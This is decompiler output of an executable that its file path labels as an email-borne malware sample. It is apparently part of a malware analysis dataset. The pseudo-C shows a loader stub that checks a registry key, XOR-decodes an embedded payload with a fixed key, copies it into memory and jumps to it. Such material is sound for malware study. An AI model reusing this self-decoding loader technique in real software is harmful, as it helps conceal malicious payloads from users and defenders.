/*	This file was automatically created by
 *	Reverse Engineering Compiler 1.6 (C) Giampiero Caprino (Mar 31 2002)
 *	Input file: './malware_via_email/malware_1066/ia32_pe/subject.exe'
 */

/*	Procedure: 0x00401040 - 0x00401073
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L00401040(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ecx;
    for(*(ebp - 4) = 0; *(ebp - 4) < A10; *(ebp - 4) = eax) {
        edx = A8 + *(ebp - 4);
        *edx = *(Ac + *(ebp - 4));
        eax = *(ebp - 4) + 1;
    }
}

/*	Procedure: 0x00401074 - 0x0040108B
 *	Argument size: 16
 *	Local size: 0
 *	Save regs size: 0
 */

L00401074()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (restore)ebp;
    return(1);
}

stack space not deallocated on return
/*	Procedure: 0x0040108C - 0x004010C9
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L0040108C()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    (save)ebp;
    ebp = esp;
    (save)ecx;
    for(*(ebp - 4) = 0; *(ebp - 4) < *(ebp + 16); *(ebp - 4) = eax) {
        edx = *(ebp + 8) + *(ebp - 4);
        *edx = *(ebp + 12);
        ecx = *(ebp + 8) + *(ebp - 4);
        *ecx = *(ebp + 12);
        eax = *(ebp - 4) + 1;
    }
    esp = ebp;
    (restore)ebp;
}

/*	Procedure: 0x004010CA - 0x004010CF
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004010CA()
{



    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

/* DEST BLOCK NOT FOUND: 00401253 -> 00401290 */
/*	Procedure: 0x004010D0 - 0x00401261
 *	Argument size: 4
 *	Local size: 136
 *	Save regs size: 12
 */

__entry_point__(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffff78;
	/* unknown */ void  Vffffff7c;
	/* unknown */ void  Vffffff80;
	/* unknown */ void  Vffffff84;
	/* unknown */ void  Vffffff88;
	/* unknown */ void  Vffffff8c;
	/* unknown */ void  Vfffffffc;



    (save)0;
    Vffffff88 = *__imp__GetModuleHandleA();
    (save) & Vffffff80;
    (save)"SOFTWARE\Classes\.bmp";
    (save)-2147483646;
    if(*__imp__RegOpenKeyA() != 0) {
        eax = 1;
    } else {
        Vffffff8c = A8;
        *L004090E8 = !(ecx = Vffffff8c & 65535) ? 0 : 1;
        if(*L004090E8 != 0) {
            *L004090D8 = Vffffff8c;
        }
        Vffffff84 = 0x405000;
        Vffffff7c = *Vffffff84;
        Vffffff78 = *(Vffffff84 + 4);
        for(Vfffffffc = 0; Vfffffffc < Vffffff7c; Vfffffffc = Vfffffffc + 8) {
            *(Vffffff84 + Vfffffffc + 8) = *(Vffffff84 + Vfffffffc + 8) ^ 1222211;
        }
        *L004090E4 = L004026C0(Vffffff78);
        L00402870(Vffffff84 + 8, *L004090E4, Vffffff7c);
        *L004090D4 = edi;
        *L004090D0 = esi;
        *L004090E0 = ebx;
        ecx = 1;
        Vfffffffc = 0x40122c;
        *L004090EC = *%fs:0x18];
        *L004090DC = ebp;
        if(*L004090E8 != 0) {
            L004026F0(Vfffffffc - Vffffff8c, Vffffff8c);
        } else {
            L004026F0(Vfffffffc - Vffffff88, Vffffff88);
        }
        L00401290( *L004090E4);
        esp = *L004090DC;
        esi = *L004090D0;
        edi = *L004090D4;
        ebx = *L004090E0;
        esp = esp + 4;
        goto ( *L004090f0);
        eax = 0;
    }
}

/*	Procedure: 0x00401270 - 0x0040128F
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L00401270(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    *(ebp - 4) = *__imp__GetProcAddress(A8, Ac, ecx);
    return(*(ebp - 4));
    asm("int3");
    asm("int3");
    asm("int3");
    asm("int3");
}

